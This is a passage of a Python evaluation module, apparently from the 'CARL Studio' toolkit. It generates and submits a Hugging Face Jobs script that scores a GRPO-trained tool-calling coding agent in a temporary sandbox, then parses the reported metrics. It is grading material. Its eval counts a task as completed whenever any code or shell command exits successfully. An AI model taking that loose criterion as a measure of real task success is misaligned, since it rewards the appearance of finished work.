            batch = samples[i : i + self.config.batch_size]
            for sample in batch:
                prompt = sample.get("prompt") or sample.get("query") or sample.get("text", "")
                if isinstance(prompt, list):
                    if hasattr(tokenizer, "apply_chat_template"):
                        text = tokenizer.apply_chat_template(
                            prompt,
                            tokenize=False,
                            add_generation_prompt=True,
                        )
                    else:
                        text = "\n".join(
                            m.get("content", "") for m in prompt if isinstance(m, dict)
                        )
                else:
                    text = str(prompt)

                inputs = tokenizer(
                    text,
                    return_tensors="pt",
                    truncation=True,
                    max_length=2048,
                )
                inputs = {k: v.to(model.device) for k, v in inputs.items()}

                with torch.no_grad():
                    output_ids = model.generate(
                        **inputs,
                        max_new_tokens=512,
                        do_sample=False,
                        pad_token_id=tokenizer.pad_token_id,
                    )

                new_tokens = output_ids[0, inputs["input_ids"].shape[1] :]
                completion = tokenizer.decode(new_tokens, skip_special_tokens=True)
                completions.append(completion)

            if (i + self.config.batch_size) % 50 == 0:
                logger.info(
                    "Generated %d / %d",
                    min(i + self.config.batch_size, len(samples)),
                    len(samples),
                )

        return completions

    # ------------------------------------------------------------------
    # Metrics dispatch
    # ------------------------------------------------------------------

    def _compute_metrics(
        self,
        completions: list[str],
        samples: list[dict[str, Any]],
    ) -> dict[str, float]:
        """Dispatch to phase-specific metric computation."""
        if self.phase == "1":
            return _compute_phase1_metrics(completions, samples)
        elif self.phase == "2":
            return _compute_phase2_metrics(completions, samples)
        else:
            return _compute_phase1_metrics(completions, samples)

    def _compute_coherence(
        self,
        model: Any,
        tokenizer: Any,
        completions: list[str],
    ) -> dict[str, float] | None:
        """Optionally compute CARL coherence metrics."""
        try:
            import torch

            if not torch.cuda.is_available():
                return None
        except ImportError:
            return None

        try:
            from carl_core import CoherenceProbe

            vocab_size = model.config.vocab_size
            probe = CoherenceProbe(vocab_size=vocab_size)

            phi_values: list[float] = []
            cloud_values: list[float] = []
            disc_values: list[float] = []

            subset = completions[:20]
            for text in subset:
                if not text.strip() or len(text) < 10:
                    continue
                try:
                    inputs = tokenizer(
                        text,
                        return_tensors="pt",
                        truncation=True,
                        max_length=512,
                    )
                    inputs = {k: v.to(model.device) for k, v in inputs.items()}

                    was_training = model.training
                    model.eval()
                    with torch.no_grad():
                        outputs = model(**inputs)
                    if was_training:
                        model.train()

                    logits = outputs.logits[0]
                    token_ids = inputs["input_ids"][0]

                    snapshot = probe.measure(logits, token_ids)
                    phi_values.append(snapshot.phi_mean)
                    cloud_values.append(snapshot.cloud_quality_mean)
                    disc_values.append(snapshot.discontinuity_score)

                    del outputs, logits, inputs
                    torch.cuda.empty_cache()
                except Exception as e:
                    logger.warning("Coherence probe failed on sample: %s", e)
                    continue

            if not phi_values:
                return None

            return {
                "phi_mean": round(statistics.mean(phi_values), 4),
                "cloud_quality_mean": round(statistics.mean(cloud_values), 4),
                "discontinuity_score": round(statistics.mean(disc_values), 4),
            }
        except Exception as e:
            logger.warning("Coherence computation skipped: %s", e)
            return None


# ---------------------------------------------------------------------------
# Remote eval: HF Jobs
# ---------------------------------------------------------------------------


def generate_eval_script(config: EvalConfig) -> str:
    """Generate a self-contained PEP 723 eval script for HF Jobs.

    The script includes all dependencies inline, the tool call parser,
    the sandbox, and the multi-turn eval loop.
    """
    import textwrap

    base_model = config.base_model
    if not base_model:
        raise ValueError(
            "base_model is required for eval script generation. "
            "Set it via EvalConfig(base_model=...) or --base-model."
        )
    sft_adapter = config.sft_adapter or ""
    checkpoint = config.checkpoint
    dataset = config.dataset
    max_samples = config.max_samples or 100
    max_tokens = config.max_new_tokens
    max_turns = config.max_turns
    threshold = config.threshold
    data_files = config.data_files or "eval.jsonl"

    return textwrap.dedent(f'''\
        # /// script
        # requires-python = ">=3.10"
        # dependencies = [
        #     "carl-studio @ https://huggingface.co/datasets/wheattoast11/zero-rl-tool-calling-data/resolve/main/carl_studio-{__version__}-py3-none-any.whl",
        #     "transformers>=5.3.0",
        #     "peft>=0.18.0",
        #     "accelerate>=0.24.0",
        #     "bitsandbytes",
        #     "datasets",
        #     "huggingface_hub",
        #     "numpy",
        #     "Pillow",
        #     "torch>=2.5.0,<2.7.0",
        #     "torchvision",
        #     "qwen-vl-utils",
        #     "jmespath",
        # ]
        # ///
        """CARL Studio -- Phase 2' Eval (auto-generated for HF Jobs)."""
        import json
        import os
        import re
        import shlex
        import shutil
        import subprocess
        import sys
        import tempfile
        import time

        _SHELL_METACHARS = (";", "|", "&", "$(", "`", ">", "<", ">>", "<<")

        import torch
        from datasets import load_dataset
        from peft import PeftModel
        from transformers import AutoModelForImageTextToText, AutoProcessor

        BASE_MODEL = os.environ.get("CARL_MODEL", "{base_model}")
        SFT_ADAPTER = os.environ.get("CARL_SFT_ADAPTER", "{sft_adapter}")
        GRPO_ADAPTER = os.environ.get("CARL_ADAPTER", "{checkpoint}")
        DATASET = os.environ.get("CARL_DATASET", "{dataset}")
        DATA_FILES = "{data_files}"
        EVAL_SAMPLES = int(os.environ.get("CARL_EVAL_SAMPLES", "{max_samples}"))
        MAX_NEW_TOKENS = {max_tokens}
        MAX_TURNS = {max_turns}
        THRESHOLD = {threshold}
        HF_TOKEN = os.environ.get("HF_TOKEN")

        SYSTEM_PROMPT = """You are a coding agent. You solve programming tasks by reading files, writing code, and executing it.

        Use the available tools to interact with the sandbox environment. Write code, run it, check the output, fix errors. The task is complete when your code executes successfully.

        Do NOT explain what you are doing. Just act."""

        TOOLS = [
            {{"type": "function", "function": {{"name": "read_file", "description": "Read a file from the sandbox.", "parameters": {{"type": "object", "properties": {{"path": {{"type": "string", "description": "File path relative to sandbox root."}}}}, "required": ["path"]}}}}}},
            {{"type": "function", "function": {{"name": "write_file", "description": "Write content to a file in the sandbox.", "parameters": {{"type": "object", "properties": {{"path": {{"type": "string", "description": "File path relative to sandbox root."}}, "content": {{"type": "string", "description": "The content to write."}}}}, "required": ["path", "content"]}}}}}},
            {{"type": "function", "function": {{"name": "execute_code", "description": "Execute Python code in the sandbox.", "parameters": {{"type": "object", "properties": {{"code": {{"type": "string", "description": "Python source code to execute."}}}}, "required": ["code"]}}}}}},
            {{"type": "function", "function": {{"name": "run_shell", "description": "Run a shell command in the sandbox.", "parameters": {{"type": "object", "properties": {{"command": {{"type": "string", "description": "Shell command to execute."}}}}, "required": ["command"]}}}}}},
        ]

        _FUNC_PATTERN = re.compile(r'<function=([^>]+)>(.*?)</function>', re.DOTALL)
        _PARAM_PATTERN = re.compile(r'<parameter=([^>]+)>(.*?)</parameter>', re.DOTALL)

        def parse_tool_calls(text):
            calls = []
            for func_match in _FUNC_PATTERN.finditer(text):
                func_name = func_match.group(1).strip()
                func_body = func_match.group(2)
                args = {{}}
                for param_match in _PARAM_PATTERN.finditer(func_body):
                    args[param_match.group(1).strip()] = param_match.group(2).strip()
                calls.append({{"name": func_name, "arguments": args}})
            if calls:
                return calls
            pos = 0
            while True:
                start = text.find("<tool_call>", pos)
                if start == -1:
                    break
                end = text.find("</tool_call>", start)
                if end == -1:
                    break
                block = text[start + 11:end].strip()
                try:
                    data = json.loads(block)
                    if "function" in data:
                        fn = data["function"]
                        fn_args = fn.get("arguments", {{}})
                        if isinstance(fn_args, str):
                            fn_args = json.loads(fn_args)
                        calls.append({{"name": fn["name"], "arguments": fn_args}})
                    elif "name" in data:
                        fn_args = data.get("arguments", {{}})
                        if isinstance(fn_args, str):
                            fn_args = json.loads(fn_args)
                        calls.append({{"name": data["name"], "arguments": fn_args}})
                except (json.JSONDecodeError, KeyError, TypeError):
                    pass
                pos = end + 12
            if calls:
                return calls
            i = 0
            while i < len(text):
                if text[i] == '{{':
                    depth = 0
                    for j in range(i, len(text)):
                        if text[j] == '{{':
                            depth += 1
                        elif text[j] == '}}':
                            depth -= 1
                        if depth == 0:
                            try:
                                data = json.loads(text[i:j + 1])
                                if isinstance(data, dict) and "name" in data:
                                    fn_args = data.get("arguments", {{}})
                                    if isinstance(fn_args, str):
                                        fn_args = json.loads(fn_args)
                                    calls.append({{"name": data["name"], "arguments": fn_args}})
                            except (json.JSONDecodeError, TypeError):
                                pass
                            i = j + 1
                            break
                    else:
                        i += 1
                else:
                    i += 1
            return calls


        class EvalSandbox:
            def __init__(self):
                self.workdir = tempfile.mkdtemp(prefix="carl_eval_")
                self.task_completed = False
                self.tool_calls = 0
                self.tool_failures = 0

            def _safe_path(self, path):
                if os.path.isabs(path):
                    path = path.lstrip("/")
                resolved = os.path.normpath(os.path.join(self.workdir, path))
                if not (resolved == self.workdir or resolved.startswith(self.workdir + os.sep)):
                    raise ValueError(f"Path escapes sandbox: {{path}}")
                return resolved

            def execute_tool(self, name, args):
                self.tool_calls += 1
                try:
                    if name == "read_file":
                        with open(self._safe_path(args["path"])) as f:
                            return f.read()
                    elif name == "write_file":
                        fpath = self._safe_path(args["path"])
                        os.makedirs(os.path.dirname(fpath), exist_ok=True)
                        with open(fpath, "w") as f:
                            f.write(args["content"])
                        return f"Written {{len(args['content'])}} bytes to {{args['path']}}"
                    elif name == "execute_code":
                        fpath = os.path.join(self.workdir, "_exec.py")
                        with open(fpath, "w") as f:
                            f.write(args["code"])
                        result = subprocess.run(["python", fpath], capture_output=True, text=True, timeout=10, cwd=self.workdir)
                        if result.returncode == 0:
                            self.task_completed = True
                            return result.stdout if result.stdout.strip() else "(executed successfully)"
                        else:
                            self.tool_failures += 1
                            return f"Error (exit {{result.returncode}}): {{result.stderr[:500]}}"
                    elif name == "run_shell":
                        cmd_str = args.get("command", "")
                        if not isinstance(cmd_str, str) or not cmd_str.strip():
                            self.tool_failures += 1
                            return "Error: empty shell command"
                        if any(m in cmd_str for m in _SHELL_METACHARS):
                            self.tool_failures += 1
                            return "Error: shell metacharacters not permitted; use execute_code for pipelines"
                        try:
                            tokens = shlex.split(cmd_str)
                        except ValueError as exc:
                            self.tool_failures += 1
                            return f"Error: could not parse command: {{exc}}"
                        if not tokens:
                            self.tool_failures += 1
                            return "Error: empty shell command after parsing"
                        result = subprocess.run(tokens, capture_output=True, text=True, timeout=10, cwd=self.workdir, shell=False)
                        if result.returncode == 0:
                            self.task_completed = True
                            return result.stdout if result.stdout.strip() else "(success)"
                        else:
                            self.tool_failures += 1
                            return f"Error (exit {{result.returncode}}): {{result.stderr[:500]}}"
                    else:
                        self.tool_failures += 1
                        return f"Unknown tool: {{name}}"
                except Exception as e:
                    self.tool_failures += 1
                    return f"Error: {{e}}"

            def cleanup(self):
                if os.path.exists(self.workdir):
                    shutil.rmtree(self.workdir, ignore_errors=True)


        def run_eval():
            print("=" * 60)
            print("  Phase 2' Eval: Environment GRPO Tool-Calling")
            print("=" * 60)
            use_bf16 = torch.cuda.is_available() and torch.cuda.is_bf16_supported()
            dtype = torch.bfloat16 if use_bf16 else torch.float16

            print(f"Loading base model ({{dtype}})...")
            model = AutoModelForImageTextToText.from_pretrained(
                BASE_MODEL, torch_dtype=dtype, device_map="cuda:0",
                trust_remote_code=True, token=HF_TOKEN)

            if SFT_ADAPTER:
                print(f"Merging SFT adapter: {{SFT_ADAPTER}}")
                try:
                    model = PeftModel.from_pretrained(model, SFT_ADAPTER, token=HF_TOKEN)
                    model = model.merge_and_unload()
                    print("  SFT adapter merged")
                except Exception as e:
                    print(f"  WARNING: SFT adapter failed: {{e}}")

            print(f"Loading GRPO adapter: {{GRPO_ADAPTER}}")
            try:
                model = PeftModel.from_pretrained(model, GRPO_ADAPTER, token=HF_TOKEN)
                model = model.merge_and_unload()
                print("  GRPO adapter merged")
            except Exception as e:
                print(f"  WARNING: GRPO adapter failed: {{e}}")

            model.eval()
            if hasattr(model, "generation_config"):
                model.generation_config.enable_thinking = False

            tokenizer_source = GRPO_ADAPTER
            processor = AutoProcessor.from_pretrained(tokenizer_source, token=HF_TOKEN, trust_remote_code=True)
            tokenizer = processor.tokenizer if hasattr(processor, "tokenizer") else processor
            if not tokenizer.chat_template or "tool_call" not in tokenizer.chat_template:
                print(f"  WARNING: {{tokenizer_source}} missing tool template, falling back to Qwen/Qwen3.5-9B")
                processor = AutoProcessor.from_pretrained("Qwen/Qwen3.5-9B", token=HF_TOKEN, trust_remote_code=True)
                tokenizer = processor.tokenizer if hasattr(processor, "tokenizer") else processor
            if tokenizer.pad_token is None:
                tokenizer.pad_token = tokenizer.eos_token

            print(f"Loading dataset: {{DATASET}}")
            ds = load_dataset(DATASET, split="train", data_files=DATA_FILES, token=HF_TOKEN)
            eval_ds = ds.select(range(min(EVAL_SAMPLES, len(ds))))
            print(f"Eval samples: {{len(eval_ds)}}")
            sys.stdout.flush()

            results = []
            t0 = time.time()

            for idx in range(len(eval_ds)):
                example = eval_ds[idx]
                messages = example.get("messages", [])
                if not messages:
                    continue
                eval_messages = [m for m in messages if m["role"] in ("system", "user")]
                if not eval_messages:
                    continue
                user_task = ""
                for m in messages:
                    if m["role"] == "user":
                        user_task = m["content"][:80] if isinstance(m["content"], str) else str(m["content"])[:80]
                        break

                sandbox = EvalSandbox()
                has_tool_call = False
                total_generated_tokens = 0

                try:
                    conversation = list(eval_messages)
                    for turn in range(MAX_TURNS):
                        text_prompt = tokenizer.apply_chat_template(
                            conversation, tokenize=False, add_generation_prompt=True,
                            tools=TOOLS, enable_thinking=False)
                        inputs = tokenizer(text_prompt, return_tensors="pt").to(model.device)
                        with torch.no_grad():
                            output_ids = model.generate(
                                **inputs, max_new_tokens=MAX_NEW_TOKENS,
                                do_sample=False, pad_token_id=tokenizer.pad_token_id)
                        new_tokens = output_ids[0][inputs["input_ids"].shape[1]:]
                        total_generated_tokens += len(new_tokens)
                        response_raw = tokenizer.decode(new_tokens, skip_special_tokens=False).strip()
                        response = tokenizer.decode(new_tokens, skip_special_tokens=True).strip()
                        tool_calls = parse_tool_calls(response_raw) or parse_tool_calls(response)
                        if not tool_calls:
                            conversation.append({{"role": "assistant", "content": response}})
                            break
                        has_tool_call = True
                        conversation.append({{
                            "role": "assistant", "content": response,
                            "tool_calls": [{{"function": {{"name": tc["name"], "arguments": tc["arguments"]}}}} for tc in tool_calls],
                        }})
                        for tc in tool_calls:
                            result = sandbox.execute_tool(tc["name"], tc["arguments"])
                            conversation.append({{"role": "tool", "content": result[:2000]}})
                        if sandbox.task_completed:
                            break
                except Exception as e:
                    print(f"  [{{idx+1}}] Error: {{e}}", file=sys.stderr)

                results.append({{
                    "idx": idx, "task_completed": sandbox.task_completed,
                    "has_tool_call": has_tool_call, "tool_calls": sandbox.tool_calls,
                    "tool_failures": sandbox.tool_failures, "tokens": total_generated_tokens,
                    "task": user_task,
                }})
                sandbox.cleanup()
                status = "PASS" if sandbox.task_completed else ("TOOL" if has_tool_call else "TEXT")
                if (idx + 1) % 5 == 0 or idx < 3:
                    print(f"  [{{idx+1:3d}}/{{len(eval_ds)}}] {{status:4s}} | calls={{sandbox.tool_calls}} fail={{sandbox.tool_failures}} tok={{total_generated_tokens:4d}} | {{user_task[:50]}}")
                    sys.stdout.flush()

            elapsed = time.time() - t0
            total = len(results)
            if total == 0:
                print("ERROR: No results.")
                return

            task_completion = sum(1 for r in results if r["task_completed"]) / total
            tool_format = sum(1 for r in results if r["has_tool_call"]) / total
            tool_frequency = sum(r["tool_calls"] for r in results) / total
            failure_rate = sum(r["tool_failures"] for r in results) / max(sum(r["tool_calls"] for r in results), 1)
            mean_tokens = sum(r["tokens"] for r in results) / total
            gate_pass = task_completion >= THRESHOLD

            print(f"\\n{{'='*60}}")
            print(f"  EVAL RESULTS -- Phase 2' Environment GRPO")
            print(f"{{'='*60}}")
            print(f"  {{'Task completion:':<30s}} {{task_completion:>8.2%}}")
            print(f"  {{'Tool format compliance:':<30s}} {{tool_format:>8.2%}}")
            print(f"  {{'Mean tool calls:':<30s}} {{tool_frequency:>8.2f}}")
            print(f"  {{'Failure rate:':<30s}} {{failure_rate:>8.2%}}")
            print(f"  {{'Mean tokens:':<30s}} {{mean_tokens:>8.0f}}")
            print(f"-" * 60)
            print(f"  {{'PHASE 2\\' GATE (>='+ str(int(THRESHOLD*100)) +'%):':<30s}} {{'PASS' if gate_pass else 'FAIL':>8s}}")
            print(f"  {{'Elapsed:':<30s}} {{elapsed:>7.1f}}s")
            print(f"{{'='*60}}")

            output = {{
                "model": GRPO_ADAPTER,
                "sft_adapter": SFT_ADAPTER,
                "base_model": BASE_MODEL,
                "eval_samples": total,
                "metrics": {{
                    "task_completion": round(task_completion, 4),
                    "tool_format_compliance": round(tool_format, 4),
                    "mean_tool_calls": round(tool_frequency, 2),
                    "failure_rate": round(failure_rate, 4),
                    "mean_tokens": round(mean_tokens, 0),
                    "phase2prime_pass": gate_pass,
                }},
            }}
            print(f"\\n{{json.dumps(output, indent=2)}}")

        if __name__ == "__main__":
            run_eval()
    ''')


def submit_eval_job(
    config: EvalConfig,
    hardware: str = "l40sx1",
    timeout: int = 7200,
) -> str:
    """Submit eval as an HF Job. Returns job ID.

    Args:
        config: Eval configuration.
        hardware: HF Jobs flavor (l40sx1 for eval, not a100).
        timeout: Job timeout in seconds.

    Returns:
        HF Job ID string.
    """
    try:
        from huggingface_hub import HfApi, get_token
    except ImportError as exc:
        raise ImportError(HF_EXTRA_HINT) from exc

    script = generate_eval_script(config)

    api = HfApi()
    hf_token = get_token()

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(script)
        script_path = f.name

    try:
        job = api.run_uv_job(
            script=script_path,
            flavor=hardware,
            timeout=timeout,
            env={"PYTHONUNBUFFERED": "1"},
            secrets={"HF_TOKEN": hf_token},
        )
        return job.id
    finally:
        os.unlink(script_path)


def poll_eval_results(
    job_id: str,
    poll_interval: float = 30.0,
    timeout: float = 7200.0,
) -> EvalReport | None:
    """Poll an HF Job until complete, parse results from logs.

    Args:
        job_id: HF Job ID.
        poll_interval: Seconds between polls.
        timeout: Max wait time in seconds.

    Returns:
        EvalReport if results found, None on timeout/failure.
    """
    try:
        from huggingface_hub import HfApi
    except ImportError as exc:
        raise ImportError(HF_EXTRA_HINT) from exc

    api = HfApi()
    start = time.time()

    while (time.time() - start) < timeout:
        try:
            job = api.inspect_job(job_id=job_id)
            stage = job.status.stage.lower()

            if stage in ("completed", "success", "finished"):
                return _parse_eval_logs(api, job_id)
            elif stage in ("failed", "error", "cancelled"):
                logger.error("Eval job %s ended with status: %s", job_id, stage)
                return None
            else:
                logger.info("Eval job %s: %s", job_id, stage)
        except Exception as e:
            logger.warning("Poll error: %s", e)

        time.sleep(poll_interval)

    logger.error("Eval job %s timed out after %.0fs", job_id, timeout)
    return None


def _parse_eval_logs(api: Any, job_id: str) -> EvalReport | None:
    """Parse JSON output from eval job logs."""
    try:
        raw_logs = list(api.fetch_job_logs(job_id=job_id))
        log_text = "\n".join(str(e) for e in raw_logs[-100:])

        # Find JSON output block
        json_match = re.search(r'\{[^{}]*"metrics"[^{}]*\{[^{}]*\}[^{}]*\}', log_text, re.DOTALL)
        if not json_match:
            # Try finding it more broadly
            for line in reversed(log_text.split("\n")):
                line = line.strip()
                if line.startswith("{") and "metrics" in line:
                    try:
                        data = json.loads(line)
                        return _build_report_from_json(data)
                    except json.JSONDecodeError:
                        continue
            logger.warning("Could not parse eval results from job logs")
            return None

        data = json.loads(json_match.group(0))
        return _build_report_from_json(data)

    except Exception as e:
        logger.error("Failed to parse eval logs: %s", e)
        return None


def _build_report_from_json(data: dict[str, Any]) -> EvalReport:
    """Build EvalReport from the JSON output of the eval script."""
    metrics_data = data.get("metrics", {})
    task_completion = metrics_data.get(
        "task_completion_rate", metrics_data.get("task_completion", 0.0)
    )
    gate_pass = metrics_data.get("phase2prime_pass", False)

    # Remove gate flag from metrics dict
    clean_metrics = {k: v for k, v in metrics_data.items() if k != "phase2prime_pass"}

    return EvalReport(
        checkpoint=data.get("model", "unknown"),
        phase="2prime",
        n_samples=data.get("eval_samples", 0),
        metrics=clean_metrics,
        primary_metric="task_completion_rate",
        primary_value=task_completion,
        threshold=0.30,
        passed=gate_pass,
    )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _get_hf_token() -> str | None:
    """Get HF token from huggingface_hub credentials (not shell env)."""
    try:
        from huggingface_hub import get_token

        return get_token()
    except Exception:
        return None
